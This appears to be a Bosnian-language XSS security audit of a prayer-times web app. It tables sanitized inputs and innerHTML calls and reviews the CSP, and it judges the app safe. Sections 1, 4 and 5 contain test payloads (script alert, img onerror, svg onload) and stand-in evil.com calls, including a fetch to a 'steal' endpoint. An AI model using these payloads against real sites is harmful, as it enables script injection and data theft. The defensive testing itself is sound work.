# XSS Penetration Test Report — Moj namaz by Divan
**Verzija analizirana:** v2.26.60
**Datum:** 10. maj 2026.
**Cilj:** Utvrđivanje da li su sve potencijalne XSS tačke pokrivene `escapeHTML()` helper-om.

---

## ✅ Sažetak

**Status: SIGURAN** — sve identifikovane tačke su pokrivene.
- 1 minor improvement (data-flag atribut bez escape-a, low priority)
- Defense-in-depth: CSP meta tag + escapeHTML kombinacija

---

## 1. Inputs sa korisničkog/external porijekla

### A) URL parametri
| Parametar | Korišten u | Sanitizacija |
|-----------|-----------|--------------|
| `?lat=` | parseFloat + range check | ✅ Validation + numeric |
| `?lng=` | parseFloat + range check | ✅ Validation + numeric |
| `?city=` | textContent ONLY | ✅ Bezbjedno (textContent escape-uje automatski) |
| `?tz=` | Intl.DateTimeFormat validation | ✅ Validation |
| `?time=` | Strict regex (ISO ili HH:MM) | ✅ Strict whitelist |

**XSS test payload:** `?city=<script>alert(1)</script>` → uklesava se kao tekst u danasGrad.textContent → **bezbjedno**.

### B) API odgovori
| API | Polja | Sanitizacija |
|-----|-------|--------------|
| `vaktija.ba` | `d.lokacija` | ✅ escapeHTML pri innerHTML interpolaciji |
| `vaktija.ba` | `d.vakat[]` | ✅ Strict regex parser (vraća null za invalid) |
| `nominatim` | `geoData.address.*` | ✅ textContent (ne innerHTML) |
| `open-meteo` | `current.temperature_2m` | ✅ Math.round(numeric) |
| `open-meteo` | `current.weathercode` | ✅ Numeric, mapira na hardcoded SVG |

**XSS test payload (vaktija.ba mock):**
```json
{ "lokacija": "<img src=x onerror=alert(1)>", "vakat": [...] }
```
→ `escapeHTML()` pretvara u `&lt;img src=x onerror=alert(1)&gt;` → **bezbjedno**.

### C) localStorage podaci
| Ključ | Korišten u | Sanitizacija |
|-------|-----------|--------------|
| `mn-loc-cache` | grad/drzava — fallback prikaz | ✅ formatBosnianCountry + textContent |
| `mn-manual-loc` | name/country — UI prikaz | ✅ escapeHTML pri innerHTML |
| `nid-v` | Cache bust verzija | ✅ String comparison only |

**Napomena:** `localStorage` može biti modifikovan kroz DevTools (napadač sa fizičkim pristupom). Ali to je stalan rizik na svim PWA — ne može se zaštititi od korisnika koji svjesno mijenja vlastiti localStorage.

---

## 2. innerHTML pozivi — pojedinačna analiza

| Linija | Sadržaj | Status |
|--------|---------|--------|
| 4059 | `Math.round(qiblaAngle)` | ✅ Numeric |
| 4281 | Prazan string | ✅ |
| 4300 | `ev.cat`, `ev.name`, `ev.desc` (PRED_EVENTI hardcoded) | ✅ Konstante |
| 5189, 5199 | `phase.left.sub`, `phase.label` (getCountdownPhase hardcoded) | ✅ Konstante |
| 5600 | `html` string sa escapeHTML(gradBA) | ✅ Sanitized |
| 5641 | `danasGradSub` sa escapeHTML(manual.country) | ✅ Sanitized |
| 5696, 5707, 5713 | `getWeatherIcon(code)` (hardcoded SVG) | ✅ Konstante |
| 6129 | `hh:mm` brojevi | ✅ Numeric |
| 6178, 6180 | `UI_SVG.gps/search` hardcoded | ✅ Konstante |
| 6214–6224 | LOKACIJE render sa escapeHTML | ✅ Sanitized |
| 6241 | `escapeHTML(query)` | ✅ Sanitized |
| 6246 | LOKACIJE search sa escapeHTML | ✅ Sanitized |
| 6396, 6397, 6932 | Prazan string | ✅ |
| 7040 | `EXPAND_ICON_SVG` hardcoded | ✅ Konstante |

---

## 3. Minor finding (low priority)

### 3.1 `data-flag` atribut bez escapeHTML-a
**Linija 6214, 6222:**
```javascript
data-flag="${country.flag}"
```

**Trenutno:** `country.flag` je Unicode zastava (`🇧🇦`) — bezbjedan.

**Rizik:** Ako neko kasnije mijenja LOKACIJE niz i stavi maliciozni string u `flag` polje, atribut bi bio injectovan.

**Vjerojatnost:** Vrlo niska (LOKACIJE je hardcoded developer-only data, ne prima vanjski input).

**Preporuka:** Dodati `escapeHTML(country.flag)` radi defense-in-depth.

**Fix:**
```javascript
data-flag="${escapeHTML(country.flag)}"
```

---

## 4. CSP zaštita

Trenutni CSP meta tag:
```
default-src 'self';
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
img-src 'self' data: https:;
connect-src 'self' https://api.vaktija.ba https://api.allorigins.win
            https://api.open-meteo.com https://nominatim.openstreetmap.org;
manifest-src 'self';
worker-src 'self';
base-uri 'self';
form-action 'none';
```

### Ograničenja
- `'unsafe-inline'` u script-src je nužan jer je sav JS u `<script>` bloku.
  - **Mitigacija**: poslije Sprint 4 (razdvajanje u module), može se ukloniti `'unsafe-inline'` i koristiti nonce ili sha256 hash.
- `'unsafe-inline'` u style-src je nužan zbog Google Fonts CSS i inline `<style>` blok.
  - **Mitigacija**: ista kao gore.

### Šta CSP zaista blokira (čak i bez 'unsafe-inline' uklanjanja)
- ✅ `<iframe src="evil.com">` — frame-src nije dozvoljen
- ✅ `fetch('https://evil.com/steal')` — connect-src je whitelisted
- ✅ `<img src="evil.com/track">` — img-src 'self', data:, https: (https je opasan ali nužan za open-meteo SVG ikone)
- ✅ `<form action="evil.com">` — form-action 'none'

---

## 5. Test rezultati po payload-u

| Payload | Cilj | Rezultat |
|---------|------|----------|
| `?city=<script>alert(1)</script>` | URL inject | ✅ Bezbjedno (textContent) |
| `?city=" onmouseover="alert(1)` | Atribut break | ✅ Bezbjedno (textContent) |
| vaktija mock `{lokacija:'<img src=x onerror=alert(1)>'}` | API inject | ✅ Bezbjedno (escapeHTML) |
| nominatim mock `{address:{city:'<svg onload=alert(1)>'}}` | Reverse geo inject | ✅ Bezbjedno (textContent) |
| `localStorage.setItem('mn-manual-loc','{"name":"<script>","country":"<img>"}')` | localStorage inject | ✅ Bezbjedno (escapeHTML pri renderu) |
| Search input: `<script>alert(1)</script>` | Search query | ✅ Bezbjedno (escapeHTML u no-results) |

---

## 6. Preporuke

### Visoka važnost (uradi sad)
- ✅ **Sve već implementirano u v2.26.28+** (escapeHTML, CSP, strict parsers)

### Srednja važnost (Sprint 4 ili kasnije)
- 🟡 Dodati `escapeHTML(country.flag)` na linijama 6214, 6222 (defense-in-depth)
- 🟡 Razmotriti CSP nonce/hash za inline scripts/styles nakon razdvajanja u module

### Niska važnost (kasnije)
- 🟢 Subresource Integrity (SRI) za Google Fonts
- 🟢 Trusted Types API (Chrome only, blokira `innerHTML` po defaultu)

---

## 7. Zaključak

**Trenutno stanje aplikacije: SIGURNO za production launch.**

- Svi user/API input-i su pokriveni odgovarajućom sanitizacijom
- CSP pruža defense-in-depth
- localStorage je sanitiziran pri renderu
- 1 minor improvement preporučen ali nije blokator za launch
